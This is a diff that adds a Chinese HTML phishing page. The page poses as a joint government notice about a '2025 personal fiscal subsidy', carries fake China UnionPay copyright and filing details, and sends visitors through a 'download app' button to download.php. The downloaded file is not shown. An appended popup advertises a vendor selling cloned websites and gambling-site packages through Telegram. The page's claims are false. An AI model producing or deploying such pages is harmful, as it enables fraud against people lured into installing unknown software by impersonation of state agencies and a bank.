@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>{{title}}</title>
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
+            background: #f5f5f5;
+        }
+
+        .service-platform {
+            min-height: 100vh;
+            background: url("./47/static/sytu.26b90842.jpg") center center / 100% 100% no-repeat fixed;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .loading-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .loading-dot {
+            width: 8px;
+            height: 8px;
+            background: #fff;
+            border-radius: 50%;
+            animation: pulse 1s ease-in-out infinite;
+        }
+
+        .loading-dot:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dot:nth-child(3) { animation-delay: 0.4s; }
+        .loading-dot:nth-child(4) { animation-delay: 0.6s; }
+        .loading-dot:nth-child(5) { animation-delay: 0.8s; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+
+        .popup-content {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+        }
+
+        .popup-header {
+            background: linear-gradient(135deg, #1a5bbf 0%, #0e3a7a 100%);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .popup-header p {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .popup-body {
+            padding: 24px 20px;
+            line-height: 1.6;
+            color: #333;
+            font-size: 15px;
+        }
+
+        .highlight {
+            color: #ff5f2e;
+            font-weight: 600;
+        }
+
+        .submit-button {
+            padding: 0 20px 24px;
+        }
+
+        .aaa {
+            background: linear-gradient(90deg, #4374e0, #1a5bbf);
+            border: none;
+            padding: 14px 0;
+            width: 100%;
+            text-align: center;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            display: block;
+            text-decoration: none;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 12px rgba(67, 116, 224, 0.3);
+        }
+
+        .aaa:active {
+            transform: scale(0.98);
+            box-shadow: 0 2px 6px rgba(67, 116, 224, 0.3);
+        }
+
+        .wrap {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .wrap p {
+            font-size: 12px;
+            color: #888;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+.footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    text-align: center;
+    padding: 16px 20px;
+    background: #f8f9fa;
+    border-top: 1px solid #e5e5e5;
+}
+
+.footer p {
+    font-size: 10px;
+    color: #999;
+    line-height: 1.5;
+    margin: 4px 0;
+}
+
+        @media (max-width: 480px) {
+            .popup-header p {
+                font-size: 18px;
+            }
+            .popup-body {
+                padding: 20px 16px;
+                font-size: 14px;
+            }
+            .aaa {
+                padding: 12px 0;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <div class="service-platform">
+            <div class="loading-container" id="loading" style="display: none;">
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+            </div>
+
+            <div class="popup popup-content">
+                <div class="popup-header">
+                    <p>《2025年个人财政补贴》声明</p>
+                </div>
+
+                <div class="popup-body">
+                    <p>根据国家财政部、国家税务总局、国家市场监督管理总局、工商行政管理局联合下发
+                    <span class="highlight">《2025年个人财政补贴》</span>
+                    现已开展，可即时领取补贴发放。工资补贴、社保补贴、医保补贴、毕业生补贴、中高级技工生活补贴、工龄补贴、交通补贴、医疗保险、失业保险、生育保险等。</p>
+                </div>
+
+                <div class="submit-button">
+                    <a href="#" class="aaa" id="downloadBtn">下载应用</a>
+                </div>
+            </div>
+
+            <div class="footer">
+                <p style="font-size: 10px;">©中国银联版权所有</p>
+                <p>沪ICP备08327839|沪公网安备3183723839号</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            window.open('download.php', '_blank');
+        });
+        document.querySelectorAll('.app-download').forEach(function(el) {
+            el.addEventListener('click', function(e) {
+                e.preventDefault();
+                window.open('download.php', '_blank');
+            });
+        });
+    </script>
+    
+    
+
+<!-- 购买教父科技 弹窗 -->
+<div id="jfk-popup-mask">
+  <div id="jfk-popup">
+    <div class="jfk-badge">教父科技</div>
+    <h2>购买教父科技</h2>
+    <p class="jfk-sub">网站仿写 · 机器人开发 · 博彩包网</p>
+    <div class="jfk-line"></div>
+    <a class="jfk-tg" href="https://t.me/jiaofukeji" target="_blank" rel="noopener">
+      <svg viewBox="0 0 24 24"><path d="M9.04 15.51l-.37 5.07c.53 0 .76-.23 1.03-.5l2.46-2.37 5.11 3.76c.94.52 1.6.25 1.85-.88l3.35-15.78c.3-1.37-.5-1.9-1.4-1.56L2.13 9.62c-1.32.51-1.3 1.24-.22 1.58l4.97 1.56L18.3 5.75c.54-.35 1.04-.16.63.19L9.04 15.51z"/></svg>
+      <span>@jiaofukeji</span>
+    </a>
+    <button class="jfk-close" type="button">关 闭</button>
+  </div>
+</div>
+<style>
+#jfk-popup-mask{position:fixed;left:0;top:0;width:100%;height:100%;background:rgba(7,9,15,.85);-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;}
+#jfk-popup{position:relative;width:100%;max-width:360px;background:linear-gradient(165deg,#1b1e29,#0f111a);border:1px solid rgba(255,209,74,.22);border-radius:22px;padding:36px 26px 24px;text-align:center;box-shadow:0 30px 90px rgba(0,0,0,.65);animation:jfkIn .38s cubic-bezier(.22,.9,.3,1);}
+#jfk-popup:before{content:"";position:absolute;top:0;left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%);width:150px;height:3px;background:linear-gradient(90deg,transparent,#ffd14a,transparent);border-radius:0 0 4px 4px;}
+.jfk-badge{display:inline-block;margin-bottom:16px;padding:5px 16px;border:1px solid rgba(255,209,74,.35);border-radius:999px;background:rgba(255,209,74,.08);color:#ffd14a;font-size:12px;letter-spacing:3px;}
+#jfk-popup h2{margin:0 0 12px;font-size:27px;font-weight:800;letter-spacing:1px;color:#ffd14a;}
+.jfk-sub{margin:0 0 20px;font-size:14px;line-height:1.8;color:#9aa3b2;letter-spacing:1px;}
+.jfk-line{height:1px;width:64%;margin:0 auto 20px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.16),transparent);}
+.jfk-tg{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;max-width:264px;margin:0 auto 16px;padding:13px 18px;border-radius:14px;background:linear-gradient(135deg,#2aa5e0,#1d8ccd);color:#fff;font-size:17px;font-weight:700;text-decoration:none;letter-spacing:.5px;box-shadow:0 12px 28px rgba(42,165,224,.32);}
+.jfk-tg svg{width:20px;height:20px;fill:#fff;flex:0 0 auto;}
+.jfk-close{display:block;margin:0 auto;width:130px;padding:9px;border:1px solid rgba(255,255,255,.15);border-radius:12px;background:transparent;color:#8b93a3;font-size:14px;letter-spacing:3px;cursor:pointer;}
+.jfk-close:hover{color:#fff;border-color:rgba(255,255,255,.32);}
+@keyframes jfkIn{from{opacity:0;-webkit-transform:translateY(16px) scale(.96);transform:translateY(16px) scale(.96)}to{opacity:1;-webkit-transform:translateY(0) scale(1);transform:translateY(0) scale(1)}}
+</style>
+<script>
+(function(){var m=document.getElementById('jfk-popup-mask');if(!m)return;function close(){if(m.parentNode)m.parentNode.removeChild(m);}m.addEventListener('click',function(e){if(e.target===m)close();});var c=m.querySelector('.jfk-close');if(c)c.addEventListener('click',close);})();
+</script></body>
+</html>
